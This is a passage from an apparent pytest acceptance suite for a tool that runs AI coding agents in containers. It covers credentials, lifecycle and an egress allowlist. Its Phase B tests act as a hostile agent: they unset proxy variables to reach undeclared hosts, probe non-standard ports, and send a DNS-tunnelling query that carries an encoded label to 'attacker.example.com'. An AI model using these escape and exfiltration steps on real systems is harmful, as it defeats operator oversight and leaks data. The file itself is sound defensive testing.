    assert secret not in r.stdout and secret not in r.stderr

    # SC-002: a resolver that fails aborts before any change, naming the credential.
    # Uses a FRESH environment: an already-matching one is an idempotent no-op that
    # never re-resolves, so it could not exercise the failure path.
    bad_name = "aac008b"
    bad_proj = acc.tmp / "cred008bad"
    (bad_proj / ".agent-container").mkdir(parents=True)
    (bad_proj / ".agent-container" / "environments.yaml").write_text(
        _CMD_CRED_PROJECT.format(name=bad_name).replace(
            '["printenv", "RESOLVER_SRC_008"]', '["printenv", "NO_SUCH_VAR_008"]'
        )
    )
    (bad_proj / "ci.env").write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")
    acc.register(bad_name)
    bad = acc.cli(["apply", "-y"], cwd=bad_proj, extra_env=env)
    assert bad.returncode != 0, "a failing resolver must abort the apply"
    assert "MYSECRET" in bad.stderr  # names the failing credential
    assert "unlocked" in bad.stderr  # carries the remediation hint (FR-006)
    assert _container_state(f"agent-container-{bad_name}") == ""  # nothing was created


def test_declarative_encrypted_source_refused_with_migration(acc):
    """T010 / SC-003: the removed `encrypted` source is refused before any change,
    with an actionable migration rather than a generic enum error."""
    proj = acc.tmp / "cred008mig"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: aac008mig\n    host: local\n"
        "    credentials:\n"
        "      - { name: K, source: encrypted, path: ./k.age, decrypt: 'age -d' }\n"
    )
    r = acc.cli(["status"], cwd=proj)
    assert r.returncode != 0
    assert "REMOVED" in r.stderr and "onepassword" in r.stderr
    assert "is not one of" not in r.stderr


# --- Feature 009: the agent-operable surface (real container) -----------------
# T014a — plan.md promised a real-invocation test; the analyze pass found it
# missing from the task list. SC-001 ("an agent completes a full lifecycle using
# ONLY machine-readable output") is an end-to-end claim and cannot be proven by
# hermetic units alone.


def _json_cli(acc, argv, **kw):
    """Run the real CLI with --json and return (parsed_stdout, CompletedProcess)."""
    r = acc.cli([*argv, "--json"], **kw)
    try:
        return json.loads(r.stdout), r
    except json.JSONDecodeError as e:  # stdout must ALWAYS be a clean envelope
        raise AssertionError(
            f"stdout did not parse as JSON for {argv}: {e}\nstdout={r.stdout!r}\nstderr={r.stderr[-500:]!r}"
        ) from None


def test_agent_drives_full_lifecycle_over_json(acc):
    """SC-001/SC-002/SC-003: a full lifecycle on machine-readable output alone."""
    name = "acc009"
    acc.register(name)
    env_file = acc.tmp / f"{name}.env"
    env_file.write_text("GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@example.com\n")

    # up --json: valid envelope, nothing but the envelope on stdout (FR-002)
    payload, r = _json_cli(acc, ["up", name, "--env-file", str(env_file)])
    assert r.returncode == 0, r.stderr
    assert payload["schema"] == "agent-container/v1" and payload["ok"] is True
    _wait_container_state(f"agent-container-{name}", "running")

    # list --json: the environment is visible to an agent
    payload, r = _json_cli(acc, ["list"])
    assert r.returncode == 0 and payload["ok"] is True

    # a failure yields a PARSEABLE descriptor with a stable code (SC-002)
    payload, r = _json_cli(acc, ["stop", name, "--host", "nosuchhost009"])
    assert r.returncode != 0
    assert payload["ok"] is False
    err = payload["error"]
    assert err["code"] == "host_not_registered"  # branch on the CODE, not the message
    assert err["entity"] == "nosuchhost009" and err["remedy"]

    # SC-003: a destructive command refuses on a non-TTY rather than hanging
    r = acc.cli(["down", name, "--purge"])  # no -y, not a terminal
    assert r.returncode != 0 and "-y" in r.stderr

    # tear down with explicit authorization
    payload, r = _json_cli(acc, ["down", name, "--purge", "-y"])
    assert r.returncode == 0 and payload["ok"] is True
    _wait_container_state(f"agent-container-{name}", "")


def test_context_and_skill_over_json(acc):
    """The two new commands work against a real environment; context leaks nothing."""
    payload, r = _json_cli(acc, ["context"])
    assert r.returncode == 0 and payload["ok"] is True
    data = payload["data"]
    assert {"target", "stages", "hosts", "conventions", "next_step"} <= set(data)

    # skill installs into a scratch PROJECT dir, is idempotent, and removes cleanly
    proj = acc.tmp / "skillproj"
    proj.mkdir()
    payload, r = _json_cli(acc, ["skill", "install"], cwd=proj)
    assert r.returncode == 0 and payload["data"]["changed"] is True
    skill_md = proj / ".claude" / "skills" / "agent-container" / "SKILL.md"
    assert skill_md.is_file()
    body = skill_md.read_text()
    assert body.startswith("---\n") and "name: agent-container" in body
    # FR-012c: every example in the shipped skill carries --json
    examples = [ln.strip() for ln in body.splitlines() if ln.strip().startswith("agent-container ")]
    assert examples and all("--json" in e for e in examples)

    payload, _ = _json_cli(acc, ["skill", "install"], cwd=proj)
    assert payload["data"]["changed"] is False  # idempotent
    payload, _ = _json_cli(acc, ["skill", "remove"], cwd=proj)
    assert payload["data"]["changed"] is True
    assert not skill_md.exists()


# --- Feature 010: opencode as a fourth agent (real container) ----------------


@pytest.mark.parametrize("agent", ["claude", "codex", "pi", "opencode"])
def test_every_supported_agent_launches_in_its_own_tmux_window(acc, agent):
    """US1 acceptance 1+4 / FR-004 / SC-007. Parametrised over ALL FOUR rather
    than opencode alone: FR-014 requires the existing three be unchanged, and
    SC-007 had no acceptance coverage otherwise. One list, no special cases."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    name = f"acc10w{agent[:4]}"
    acc.up(name, agent=agent, authorized_key=[laptop.with_suffix(".pub")])
    windows = _exec(name, ["tmux", "list-windows", "-t", "main", "-F", "#{window_name}"])
    assert agent in windows.stdout.split(), windows.stdout
    acc.down(name, purge=True)
    assert acc.volumes_of(name) == []  # FR-008: no orphaned storage, any agent


def test_opencode_headless_propagates_the_agent_exit_code(acc):
    """US1 acceptance 2 / FR-005. Probed against the real binary first (research
    R5): with a PRESENT-but-invalid key opencode fails and exits non-zero. Note
    the negative case is the meaningful one — with NO key opencode SUCCEEDS via a
    default model, which is why the FR-005 probe had to be split in two."""
    r = acc.up(
        "acc10hl",
        mode="headless",
        agent="opencode",
        task="print ok",
        foreground=True,
        wait=False,
        env_extra=["ANTHROPIC_API_KEY=sk-ant-invalid-acceptance-000"],
    )
    assert r.returncode != 0, f"expected the agent's failure to surface:\n{r.stdout}\n{r.stderr}"


def test_opencode_persists_config_and_credentials_across_recreate(acc):
    """US1 acceptance 3 / FR-006 / SC-002. Asserts BOTH native locations. Checking
    only the config file is exactly the failure the discarded single-volume design
    would have hidden (research R1), so this test is worthless if it drifts to one
    path. Also confirms the sibling tmux mount under ~/.config is undisturbed."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("acc10per", agent="opencode", authorized_key=[laptop.with_suffix(".pub")])
    marks = {
        "/home/dev/.config/opencode/acceptance.marker": "CONFIG",
        "/home/dev/.local/share/opencode/auth.json": '{"acceptance":"CREDENTIAL"}',
        "/home/dev/.config/tmux/acceptance.marker": "TMUX",  # sibling mount, must survive too
    }
    for path, body in marks.items():
        w = _exec("acc10per", ["bash", "-lc", f"printf '%s' {body!r} > {path}"])
        assert w.returncode == 0, f"could not write {path} as dev (rootless ownership?): {w.stderr}"

    acc.down("acc10per")  # NOT --purge: volumes must survive
    acc.up("acc10per", agent="opencode", authorized_key=[laptop.with_suffix(".pub")])

    for path, body in marks.items():
        got = _exec("acc10per", ["cat", path])
        assert got.returncode == 0, f"{path} did not survive recreation: {got.stderr}"
        assert body in got.stdout, f"{path} content changed: {got.stdout!r}"


def test_pre_upgrade_environment_still_starts_and_tears_down(acc):
    """US3 acceptance 1+2 / FR-009 / SC-005 — the feature's headline risk.

    Simulates an environment created BEFORE this change by deleting the new
    volumes from a live deployment, then exercises the paths an upgrading operator
    actually takes: `up` again (must still start) and `down --purge` (must tolerate
    the absence). No manual migration anywhere.

    Feature 016 added `runs`, so it is deleted here too. The alternative — leaving
    it and raising the expected count — would have quietly stopped simulating a
    pre-upgrade environment and started simulating a 015 one, and the operator
    upgrading FROM 015 is exactly who this test is for.
    """
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("acc10leg", authorized_key=[laptop.with_suffix(".pub")])
    acc.down("acc10leg")  # keep volumes, drop the container

    for suffix in ("opencode", "opencode-data", "runs"):
        subprocess.run(
            [RUNTIME, "volume", "rm", f"agent-container-acc10leg-{suffix}"],
            capture_output=True,
            text=True,
        )
    remaining = acc.volumes_of("acc10leg")
    assert len(remaining) == 7, f"expected the pre-010 set, got {remaining}"

    # 1. It must still come up on the upgraded code.
    acc.up("acc10leg", authorized_key=[laptop.with_suffix(".pub")])
    assert _exec("acc10leg", ["true"]).returncode == 0

    # 2. And tear down completely, with no orphan and no error.
    acc.down("acc10leg", purge=True)
    assert acc.volumes_of("acc10leg") == []


def test_opencode_injected_key_never_lands_on_a_volume(acc):
    """US2 / FR-011 / Constitution III. The key reaches the agent through the env
    only; it must appear on neither opencode volume (the on-volume auth.json is
    operator-interactive-login only) nor in the generated compose descriptor."""
    secret = "sk-ant-acceptance-SECRET-000"
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up(
        "acc10sec",
        agent="opencode",
        authorized_key=[laptop.with_suffix(".pub")],
        env_extra=[f"ANTHROPIC_API_KEY={secret}"],
    )
    # Sanity: the key really did reach the agent's environment, so the assertions
    # below are testing containment rather than passing because nothing was there.
    got = _exec("acc10sec", ["bash", "-lc", 'printf %s "${ANTHROPIC_API_KEY:-}"'])
    assert got.stdout.strip() == secret, "key never reached the container env"

    for mount in ("/home/dev/.config/opencode", "/home/dev/.local/share/opencode"):
        hit = _exec("acc10sec", ["bash", "-lc", f"grep -rl {secret!r} {mount} 2>/dev/null || true"])
        assert hit.stdout.strip() == "", f"secret found on {mount}: {hit.stdout}"

    compose = list((acc.state_dir / "agent-container" / "local").glob("acc10sec.compose.yaml"))
    for f in compose:
        assert secret not in f.read_text(), f"secret inlined in {f}"


# --- Feature 011: the layout, against real containers ------------------------


def test_consolidated_project_deploys_and_discovery_walks_up(acc):
    """Quickstart S2 + S3 (US1, contracts C1/C2). The env file is found in the
    project config directory, and the tool behaves identically when run from a
    nested subdirectory — the project root is defined by the marker, not by cwd."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    proj = acc.tmp / "proj11"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "acc11.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n"
    )
    nested = proj / "src" / "deep"
    nested.mkdir(parents=True)
    acc.register("acc11")
    r = acc.cli(["up", "acc11", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=nested)
    assert r.returncode == 0, f"deploy from a nested cwd failed:\n{r.stderr}"
    assert _exec("acc11", ["true"]).returncode == 0


def test_superseded_layout_is_refused_not_ignored(acc):
    """Quickstart S4 (FR-004). The load-bearing case: a superseded CREDENTIAL
    must refuse, because ignoring it deploys an agent without the key the
    operator believes was injected."""
    proj = acc.tmp / "proj11old"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / "acc11o.env").write_text("GH_TOKEN=x\n")
    (proj / "agent-container.acc11o.anthropic.key").write_text("sk-ant-STALE\n")
    r = acc.cli(["up", "acc11o"], cwd=proj)
    assert r.returncode != 0, "a superseded credential file must refuse, not deploy"
    out = r.stdout + r.stderr
    assert "agent-container.acc11o.anthropic.key" in out
    assert ".agent-container/acc11o.anthropic.key" not in out  # no such destination


def test_explicit_env_files_stack_in_order(acc):
    """Quickstart S4a (FR-001d/FR-001e). `-e` from anywhere, later winning."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    base = acc.tmp / "outside" / "base.env"
    base.parent.mkdir(exist_ok=True)
    base.write_text("GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\nSTACKED=first\n")
    over = acc.tmp / "outside" / "over.env"
    over.write_text("STACKED=second\n")
    acc.register("acc11e")
    r = acc.cli(
        ["up", "acc11e", "-e", str(base), "-e", str(over),
         "--authorized-key", str(laptop.with_suffix(".pub"))]
    )  # fmt: skip
    assert r.returncode == 0, f"stacked -e deploy failed:\n{r.stderr}"
    got = _exec("acc11e", ["bash", "-lc", 'printf %s "$STACKED"']).stdout.strip()
    assert got == "second", f"later -e must win, got {got!r}"


def test_shell_env_survives_recreation_at_the_new_path(acc):
    """Quickstart S7 (US3, C5). The volume NAME never changed, so this is a
    relocation rather than a migration — and `dev` must be able to write the new
    mount point (the Feature 010 trap)."""
    laptop = _gen_keypair(acc.tmp / "laptop")
    acc.up("acc11se", authorized_key=[laptop.with_suffix(".pub")])
    w = _exec("acc11se", ["bash", "-lc", 'echo "export MARK=1" >> ~/.agent-env/env'])
    assert w.returncode == 0, f"dev cannot write the new mount point: {w.stderr}"
    acc.down("acc11se")  # NOT --purge
    acc.up("acc11se", authorized_key=[laptop.with_suffix(".pub")])
    got = _exec("acc11se", ["cat", "/home/dev/.agent-env/env"])
    assert "MARK=1" in got.stdout, "shell env did not survive recreation"
    assert "agent-container-acc11se-shellenv" in acc.volumes_of("acc11se")  # name unchanged


def test_build_context_contains_only_the_image_sources(acc):
    """Quickstart S5 (US2, FR-007). The context travels to the daemon, which may
    be remote — so this is a security boundary, not tidiness."""
    r = acc.cli(["build", "acc11ctx:test"])
    assert r.returncode == 0, f"build from image/ failed:\n{r.stderr}"
    out = r.stdout + r.stderr
    for leaked in ("specs/", "bin/tests", "pyproject.toml"):
        assert leaked not in out, f"{leaked} appeared in the build context transfer"


def test_explicit_env_file_works_against_a_non_default_context(acc):
    """T016a / FR-001e (analysis C2). Remote parity for `-e`.

    Research R2b claims env files are read CLIENT-SIDE by compose, which is why a
    path that exists only on the operator's machine works against a remote
    daemon. That claim came from a docstring and nothing had run it — the same
    shape as Feature 010's `opencode run` exit-status assumption, which needed a
    real probe to get right. If compose ever resolved the path on the daemon
    instead, `-e` would silently break for every remote deployment.

    A non-default docker context pointing at the local daemon exercises the
    remote code path without a second machine (the pattern `host env` uses).
    """
    ctx = subprocess.run(
        ["docker", "context", "show"], capture_output=True, text=True
    ).stdout.strip()
    cfg = _config_dir_of(acc.state_dir)
    cfg.mkdir(parents=True, exist_ok=True)
    cfg.joinpath("hosts.json").write_text(
        json.dumps(
            {
                "version": 1,
                "default": None,
                "hosts": {"acc11rem": {"driver": "docker", "context": ctx, "address": "localhost"}},
            }
        )
    )
    outside = acc.tmp / "outside" / "remote.env"
    outside.parent.mkdir(exist_ok=True)
    outside.write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\nREMOTE_MARK=yes\n"
    )
    acc.register("acc11r")
    r = acc.cli(["up", "acc11r", "--host", "acc11rem", "-e", str(outside)])
    assert r.returncode == 0, f"-e against a non-default context failed:\n{r.stderr}"
    got = _exec("acc11r", ["bash", "-lc", 'printf %s "$REMOTE_MARK"']).stdout.strip()
    assert got == "yes", "the client-side env file did not reach a context-targeted deploy"


# --- Feature 012: egress, against real containers ---------------------------


def _egress_project(acc, name: str, egress_yaml: str):
    proj = acc.tmp / f"proj{name}"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / f"{name}.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=Test\nGIT_USER_EMAIL=t@example.com\n"
    )
    (proj / ".agent-container" / "environments.yaml").write_text(
        f"environments:\n  - name: {name}\n    host: local\n"
        f"    container:\n      agent: claude\n{egress_yaml}"
    )
    return proj


def test_undeclared_provider_is_refused_not_dropped(acc):
    """Quickstart S3 — the core case, and the one that distinguishes a REFUSAL
    from a DROP. curl exit 56 = the proxy returned a status; 28 = it dropped the
    connection (the R1a failure that produced 30-40s hangs); 0 = the request went
    around the proxy entirely.

    Asserting on %{http_code} would NOT work here: for a refused CONNECT it reads
    000 for a refusal and a drop alike (research R10a, measured).
    """
    laptop = _gen_keypair(acc.tmp / "laptop12a")
    proj = _egress_project(acc, "acc12a", "    egress:\n      allow: [{provider: anthropic}]\n")
    acc.register("acc12a")
    r = acc.cli(["up", "acc12a", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"deploy with a declaration failed:\n{r.stderr}"

    declared = _exec("acc12a", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                                "https://api.anthropic.com/v1/messages"])  # fmt: skip
    assert declared.returncode == 0, "the DECLARED provider must stay reachable"

    undeclared = _exec("acc12a", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                                  "https://api.openai.com/v1/models"])  # fmt: skip
    assert undeclared.returncode == 56, (
        f"expected 56 (refused with a status); got {undeclared.returncode} — "
        f"28 means the proxy DROPPED instead of refusing, 0 means the request "
        f"bypassed the proxy entirely"
    )


def test_operator_no_proxy_is_refused_at_deploy(acc):
    """Quickstart S6 — the feature's most likely silent failure. If this deploys,
    the declaration reads as enforced while enforcing nothing."""
    proj = _egress_project(acc, "acc12b", "    egress:\n      allow: [{provider: anthropic}]\n")
    (proj / ".agent-container" / "acc12b.env").write_text("GH_TOKEN=x\nNO_PROXY=*\n")
    acc.register("acc12b")
    r = acc.cli(["up", "acc12b"], cwd=proj)
    assert r.returncode != 0, "an operator NO_PROXY must refuse the deploy"
    assert "NO_PROXY" in r.stderr


def test_no_declaration_deploys_exactly_as_before(acc):
    """FR-004/FR-012 against a real container: an environment without an `egress:`
    key gains no proxy service and no behaviour change."""
    laptop = _gen_keypair(acc.tmp / "laptop12c")
    proj = _egress_project(acc, "acc12c", "")
    acc.register("acc12c")
    r = acc.cli(["up", "acc12c", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"an undeclared environment must deploy unchanged:\n{r.stderr}"
    model = json.loads(
        (acc.state_dir / "agent-container" / "local" / "acc12c.compose.yaml").read_text()
    )
    assert "egress" not in model["services"]
    assert _exec("acc12c", ["true"]).returncode == 0


def test_teardown_leaves_no_proxy_behind(acc):
    """The proxy shares the compose project, and `down --remove-orphans` must clear
    it — including after the declaration is DROPPED, when the regenerated file no
    longer declares the service that is still running."""
    laptop = _gen_keypair(acc.tmp / "laptop12d")
    proj = _egress_project(acc, "acc12d", "    egress:\n      allow: [{provider: anthropic}]\n")
    acc.register("acc12d")
    assert acc.cli(
        ["up", "acc12d", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    # Drop the declaration, redeploy: the generated file no longer has the service.
    (proj / ".agent-container" / "environments.yaml").write_text(
        "environments:\n  - name: acc12d\n    host: local\n    container:\n      agent: claude\n"
    )
    assert acc.cli(["redeploy", "acc12d"], cwd=proj).returncode == 0
    # -y is REQUIRED: `down` refuses a destructive action on a non-TTY without it.
    # Without this the test failed while `down` had never run at all — asserting the
    # end state without asserting the command succeeded cannot tell you which.
    d = acc.cli(["down", "acc12d", "-y"], cwd=proj)
    assert d.returncode == 0, f"down failed, so the teardown assertion is untestable:\n{d.stderr}"
    ps = subprocess.run(
        [RUNTIME, "ps", "-a", "--format", "{{.Names}}"], capture_output=True, text=True
    )
    assert "agent-egress-acc12d" not in ps.stdout, (
        "the proxy survived teardown — it carries restart: unless-stopped and is "
        "invisible to list, to every wizard picker and to assert_host_empty"
    )


# --- Feature 012 Phase B: US4 evasion, against real containers --------------
# These CANNOT be unit-tested. US4's claim is about what a HOSTILE PROCESS
# cannot do, so each scenario drives the container adversarially rather than
# cooperatively — a cooperative test would pass against Phase A too and prove
# nothing new.


def _phase_b_project(acc, name: str, extra: str = ""):
    proj = acc.tmp / f"proj{name}"
    (proj / ".agent-container").mkdir(parents=True)
    (proj / ".agent-container" / f"{name}.env").write_text(
        "GH_TOKEN=x\nGIT_USER_NAME=T\nGIT_USER_EMAIL=t@e.com\n"
    )
    (proj / ".agent-container" / "environments.yaml").write_text(
        f"environments:\n  - name: {name}\n    host: local\n"
        f"    container:\n      agent: claude\n"
        f"    egress:\n      allow:\n        - provider: anthropic\n{extra}"
    )
    return proj


def test_agent_cannot_switch_enforcement_off(acc):
    """SC-008, quickstart S12 — THE test for US4.

    Under Phase A the same call SUCCEEDS: the agent unsets HTTPS_PROXY and walks
    out. Here routing is done by the network stack, so unsetting every variable
    the agent can see changes nothing.
    """
    laptop = _gen_keypair(acc.tmp / "lapB1")
    proj = _phase_b_project(acc, "accb1")
    acc.register("accb1")
    r = acc.cli(["up", "accb1", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj)
    assert r.returncode == 0, f"deploy failed:\n{r.stderr}"

    declared = _exec("accb1", ["curl", "-s", "-o", "/dev/null", "--max-time", "25",
                               "https://api.anthropic.com/v1/messages"])  # fmt: skip
    assert declared.returncode == 0, "the DECLARED provider must stay reachable"

    evade = _exec("accb1", ["sh", "-c",
        "unset HTTPS_PROXY HTTP_PROXY https_proxy http_proxy NO_PROXY no_proxy; "
        "curl -s -o /dev/null --max-time 25 https://api.openai.com/v1/models"])  # fmt: skip
    assert evade.returncode != 0, (
        "the agent unset every proxy variable and still reached an undeclared host — "
        "enforcement is cooperative, not transparent"
    )


def test_agent_cannot_reach_a_non_standard_port(acc):
    """SC-009, quickstart S13. The hole the first design sketch left: redirecting
    only 80/443 under a default-ACCEPT policy lets 8080 straight through, which is
    WORSE than no control because the declaration still reads as constraining."""
    laptop = _gen_keypair(acc.tmp / "lapB2")
    proj = _phase_b_project(acc, "accb2")
    acc.register("accb2")
    assert acc.cli(
        ["up", "accb2", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip
    # NOT `returncode != 0`. Once the diagnostic proxy actually works, an
    # undeclared port is REFUSED WITH A STATUS rather than dropped, and `curl`
    # exits 0 for a 403 — so the old assertion failed while the port was properly
    # closed. Inverting it would be worse: `returncode == 0` also passes when the
    # agent genuinely REACHES the port, which is the hole this test exists for.
    #
    # What must hold is that the agent never gets a response from the ORIGIN. So
    # both acceptable outcomes are named, and 200 is rejected explicitly.
    for port in ("8080", "1337"):
        r = _exec("accb2", ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
                            "--max-time", "10", f"http://example.com:{port}/"])  # fmt: skip
        code = (r.stdout or "").strip()
        assert r.returncode != 0 or code == "403", (
            f"port {port} reachable under default-deny "
            f"(exit {r.returncode}, http_code {code!r}; 403 = the proxy refused it, "
            "a 2xx/3xx means the origin answered and the port is OPEN)"
        )
        # And with the proxy variables removed, nothing may answer at all — that is
        # the netfilter claim, which must not rest on the agent's cooperation.
        bare = _exec("accb2", ["env", "-u", "http_proxy", "-u", "https_proxy",
                               "-u", "HTTP_PROXY", "-u", "HTTPS_PROXY",
                               "curl", "-s", "-o", "/dev/null", "--max-time", "10",
                               f"http://example.com:{port}/"])  # fmt: skip
        assert bare.returncode != 0, (
            f"port {port} reachable with the proxy variables UNSET — the boundary "
            "is depending on the agent's cooperation, which is what US4 removes"
        )


def test_agent_container_gains_no_capability(acc):
    """SC-011, quickstart S16 — the BLOCKING check.

    If the agent shows any capability the design has inverted its own principle,
    granting privilege to the container that runs untrusted code.
    """
    laptop = _gen_keypair(acc.tmp / "lapB3")
    proj = _phase_b_project(acc, "accb3")
    acc.register("accb3")
    assert acc.cli(
        ["up", "accb3", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    def caps(container):
        r = subprocess.run(
            [RUNTIME, "inspect", container, "--format", "{{.HostConfig.CapAdd}}"],
            capture_output=True, text=True,
        )  # fmt: skip
        return r.stdout.strip()

    assert caps("agent-container-accb3") in ("[]", "<no value>", ""), "the AGENT must hold nothing"
    assert "NET_ADMIN" in caps("agent-egress-accb3"), "the privilege belongs on the proxy"


def test_declared_provider_still_resolves(acc):
    """US5 scenario 3 / T136a — the positive case.

    An allowlist-only resolver that resolves NOTHING passes every refusal test
    here. This is what separates "working" from "broken closed", and broken-closed
    is the failure this mechanism makes easy.
    """
    laptop = _gen_keypair(acc.tmp / "lapB4")
    proj = _phase_b_project(acc, "accb4")
    acc.register("accb4")
    assert acc.cli(
        ["up", "accb4", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip
    r = _exec("accb4", ["getent", "hosts", "api.anthropic.com"])
    assert r.returncode == 0 and r.stdout.strip(), "a DECLARED name must resolve"
    u = _exec("accb4", ["getent", "hosts", "api.openai.com"])
    assert u.returncode != 0, "an undeclared name must not resolve"


# A raw DNS query, because the image carries no `dig` — system dependencies are
# baked at build time and an agent never installs one at runtime (CLAUDE.md), so
# a test needing `dig` would be a test that changed the image.
#
# What `dig` gives that `getent` cannot is the RCODE, and the rcode is the only
# thing separating two outcomes an address-shaped assertion reports identically:
#
#   REFUSED (5)  — unbound declined to ASK. The question never left the boundary.
#   NXDOMAIN (3) — something upstream answered "no such name", so the question DID
#                  leave. For a tunnelling-shaped label that is a total failure
#                  wearing the costume of a success, because the payload rides in
#                  the question and not in the answer (FR-020b).
#
# It is also the tell for the rules being in the wrong POSITION rather than off:
# the daemon's own resolver answers NXDOMAIN where unbound answers REFUSED
# (research R19a, measured).
_DNS_PROBE = r"""
import socket, sys

qname, server, timeout = sys.argv[1], sys.argv[2], float(sys.argv[3])
if server == "auto":  # whatever this container was itself told to use
    with open("/etc/resolv.conf") as fh:
        server = next(ln.split()[1] for ln in fh if ln.startswith("nameserver"))
query = b"\xab\xcd\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00"
for label in qname.split("."):
    query += bytes([len(label)]) + label.encode()
query += b"\x00\x00\x01\x00\x01"
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.settimeout(timeout)
try:
    sock.sendto(query, (server, 53))
    reply, _ = sock.recvfrom(4096)
except OSError as exc:
    print(f"NORESPONSE {server} {exc}")
else:
    print(f"RCODE {reply[3] & 0x0F} {server}")
"""


def _dns_probe(env: str, qname: str, server: str = "auto", timeout: int = 8) -> str:
    """`RCODE <n> <server>` or `NORESPONSE <server> <why>`, asked from inside the
    container. A failure of the probe ITSELF is raised rather than folded into the
    result, so a broken probe can never read as a successful refusal."""
    r = _exec(env, ["python3", "-c", _DNS_PROBE, qname, server, str(timeout)])
    assert r.returncode == 0, f"the DNS probe itself failed:\n{r.stdout}\n{r.stderr}"
    return r.stdout.strip()


def test_a_declared_port_opens_that_host_and_that_port_only(acc):
    """SC-010, quickstart S14 — the granularity claim, and the one a too-permissive
    implementation passes halfway.

    Reachability alone is not the property. A rule that opened the HOST, or the
    protocol, satisfies "ssh works" while admitting everything adjacent that the
    operator did not declare — so the same host on another port and the same port
    on another host are probed too. `build_squid_acl` excludes ported entries for
    exactly this reason, and this is the only place that exclusion is observable.

    `ssh-keyscan` rather than `ssh`: it completes a real SSH handshake with the
    remote and needs no credential, so neither result can be an auth artefact.
    """
    laptop = _gen_keypair(acc.tmp / "lapB5")
    proj = _phase_b_project(acc, "accb5", "        - host: github.com\n          port: 22\n")
    acc.register("accb5")
    assert acc.cli(
        ["up", "accb5", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    declared = _exec("accb5", ["ssh-keyscan", "-T", "15", "-p", "22", "github.com"])
    assert declared.returncode == 0 and "github.com" in declared.stdout, (
        f"the DECLARED {{host: github.com, port: 22}} did not connect (exit "
        f"{declared.returncode}: {declared.stderr.strip()[:200]!r}) — default-deny "
        f"with the port entry never applied looks exactly like this"
    )

    # The SAME host, an undeclared port. 443 is redirected into squid, whose
    # allowlist deliberately carries no ported entries, so `ssl_bump terminate`
    # ends it (curl exit 35). A 0 here means declaring port 22 opened 443 as well.
    other_port = _exec("accb5", ["curl", "-s", "-o", "/dev/null", "--max-time", "20",
                                 "https://github.com/"])  # fmt: skip
    assert other_port.returncode != 0, (
        "github.com:443 answered although only port 22 was declared — the entry "
        "opened the HOST rather than the endpoint, which is the SC-010 failure"
    )

    # The same PORT, another host. gitlab.com is undeclared, so it is refused at
    # the resolver before netfilter is consulted at all; either refusal is
    # correct, what must not happen is a completed handshake.
    other_host = _exec("accb5", ["ssh-keyscan", "-T", "15", "-p", "22", "gitlab.com"])
    assert not other_host.stdout.strip(), (
        "gitlab.com:22 answered — declaring one SSH destination admitted another, "
        "i.e. the protocol was permitted generally"
    )


def test_an_undeclared_name_does_not_resolve_including_a_tunnelling_label(acc):
    """SC-012, quickstart S15 — where the rcode matters as much as the failure.

    `getent` reports only whether an address came back, and for this label that
    is the SAME ANSWER either way: measured against a public resolver,
    `<label>.attacker.example.com` returns NOERROR with an empty answer section,
    so `getent` fails identically whether the question was refused here or
    carried all the way to the attacker's nameserver. The exfiltration is in the
    question, not the answer (FR-020b) — so the label is probed for its RCODE
    too, which is the only signal that distinguishes the two.
    """
    laptop = _gen_keypair(acc.tmp / "lapB6")
    proj = _phase_b_project(acc, "accb6")
    acc.register("accb6")
    assert acc.cli(
        ["up", "accb6", "--authorized-key", str(laptop.with_suffix(".pub"))], cwd=proj
    ).returncode == 0  # fmt: skip

    tunnel = "ZXhmaWx0cmF0ZWQ.attacker.example.com"
    # The positive control FIRST: a resolver that resolves nothing passes every
    # refusal below, and research R17 shipped exactly that for a while.
    ok = _exec("accb6", ["getent", "hosts", "api.anthropic.com"])
    assert ok.returncode == 0 and ok.stdout.strip(), (
        "a DECLARED name did not resolve — every refusal below is then vacuous, "
        "and broken-closed is the failure this mechanism makes easy"
    )
    for undeclared in ("api.openai.com", tunnel):
        r = _exec("accb6", ["getent", "hosts", undeclared])
        assert r.returncode != 0, f"{undeclared} resolved: {r.stdout.strip()!r}"

    probe = _dns_probe("accb6", tunnel)
    assert probe.startswith("RCODE 5") or probe.startswith("NORESPONSE"), (
        f"expected REFUSED (rcode 5) or no answer at all for the tunnelling "
        f"label, got {probe!r}. Rcode 0, 2 or 3 all mean something ANSWERED, and "
        f"an answer means the question travelled to a nameserver that had to read "
        f"the label to produce it — the payload has left (research R19a)"
    )


def test_a_public_resolver_cannot_be_queried_directly(acc):
